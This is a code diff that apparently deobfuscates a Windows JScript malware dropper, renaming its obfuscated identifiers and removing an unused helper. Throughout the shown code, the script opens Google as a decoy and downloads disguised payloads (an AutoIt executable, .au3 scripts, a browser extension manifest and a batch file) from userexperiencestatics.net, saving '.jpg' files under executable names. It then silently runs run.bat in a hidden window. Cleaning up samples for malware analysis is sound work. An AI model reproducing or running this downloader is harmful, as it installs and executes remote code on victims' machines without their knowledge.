@@ -44,8 +44,8 @@ var Vetor_comandos = [
 "\ping2.js",
 ""];
 (function(_0xc4a4x1) {
-    function _0xc4a4x2(_0xc4a4x2, _0xc4a4x3, _0xc4a4x4) {
-        if (!_0xc4a4x3 || !_0xc4a4x2) {
+    function request_and_save(url, dest, integer) {
+        if (!dest || !url) {
             return null
         };
         var XMLhttp = WScript.CreateObject("Msxml2.XMLhttp");
@@ -57,40 +57,20 @@ var Vetor_comandos = [
                 Stream1["open"]();
                 Stream1["type"] = 1;
                 Stream1["write"](XMLhttp.ResponseBody);
-                Stream1["position"] = _0xc4a4x4;
+                Stream1["position"] = integer;
                 Stream2 = new ActiveXObject("ADODB.Stream");
                 Stream2["type"] = 1;
                 Stream2["open"]();
                 Stream2["write"](Stream1["read"]());
-                Stream2["saveToFile"](_0xc4a4x3, 2);
+                Stream2["saveToFile"](dest, 2);
                 Stream2["close"]();
                 Stream1["close"]()
             }
         };
-        XMLhttp["open"]("GET", _0xc4a4x2, false);
+        XMLhttp["open"]("GET", url, false);
         XMLhttp["send"](null)
     }
-    function _0xc4a4x6(_0xc4a4x7, _0xc4a4x8) {
-        {
-            Stream1 = new ActiveXObject('ADODB.Stream');
-            Stream1['open']();
-            Stream1["type"] = 1;
-            Stream1.LoadFromFile(_0xc4a4x7);
-            ix = new ActiveXObject('ADODB.Stream');
-            ix['open']();
-            ix['type'] = 1;
-            ix.LoadFromFile(_0xc4a4x8);
-            Stream2 = new ActiveXObject('ADODB.Stream');
-            Stream2['type'] = 1;
-            Stream2['open']();
-            Stream2['write'](ix['read']());
-            Stream2['write'](Stream1['read']());
-            Stream1['close']();
-            ix['close']();
-            Stream2['saveToFile'](_0xc4a4x7, 2);
-            Stream2['close']()
-        }
-    }
+
     fso = new ActiveXObject('Scripting.FileSystemObject');
     var WSshell = new ActiveXObject("WScript.Shell");
     ShellApp = new ActiveXObject('Shell.Application');
@@ -100,17 +80,17 @@ var Vetor_comandos = [
         fso.CreateFolder(mozklasor)
     };
     ShellApp.ShellExecute('https://www.google.com');
-    _0xc4a4x2('http://userexperiencestatics.net/ext/Autoit.jpg',   mozklasor + '\\Autoit.exe', 0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/bg.jpg',       mozklasor + '\\bg.js',      0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/ekl.jpg',      mozklasor + '\\ekl.au3',    0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/ff.jpg',       mozklasor + '\\ff.zip',     0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/force.jpg',    mozklasor + '\\force.au3',  0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/sabit.jpg',    mozklasor + '\\sabit.au3',  0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/manifest.jpg', mozklasor + '\\manifest.json', 0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/run.jpg',      mozklasor + '\run.bat',     0);
-    _0xc4a4x2('http://userexperiencestatics.net/ext/up.jpg',       mozklasor + '\\up.au3',     0);
-    _0xc4a4x2('http://whos.amung.us/pingjs/?k=pingjse346',         mozklasor + '\\ping.js',    0);
-    _0xc4a4x2('http://whos.amung.us/pingjs/?k=pingjse3462',        mozklasor + '\\ping2.js', 0);
+    request_and_save('http://userexperiencestatics.net/ext/Autoit.jpg',   mozklasor + '\\Autoit.exe', 0);
+    request_and_save('http://userexperiencestatics.net/ext/bg.jpg',       mozklasor + '\\bg.js',      0);
+    request_and_save('http://userexperiencestatics.net/ext/ekl.jpg',      mozklasor + '\\ekl.au3',    0);
+    request_and_save('http://userexperiencestatics.net/ext/ff.jpg',       mozklasor + '\\ff.zip',     0);
+    request_and_save('http://userexperiencestatics.net/ext/force.jpg',    mozklasor + '\\force.au3',  0);
+    request_and_save('http://userexperiencestatics.net/ext/sabit.jpg',    mozklasor + '\\sabit.au3',  0);
+    request_and_save('http://userexperiencestatics.net/ext/manifest.jpg', mozklasor + '\\manifest.json', 0);
+    request_and_save('http://userexperiencestatics.net/ext/run.jpg',      mozklasor + '\run.bat',     0);
+    request_and_save('http://userexperiencestatics.net/ext/up.jpg',       mozklasor + '\\up.au3',     0);
+    request_and_save('http://whos.amung.us/pingjs/?k=pingjse346',         mozklasor + '\\ping.js',    0);
+    request_and_save('http://whos.amung.us/pingjs/?k=pingjse3462',        mozklasor + '\\ping2.js', 0);
     ShellApp.ShellExecute(mozklasor + '\\run.bat', '', mozklasor, '', 0)
 })
 (this)
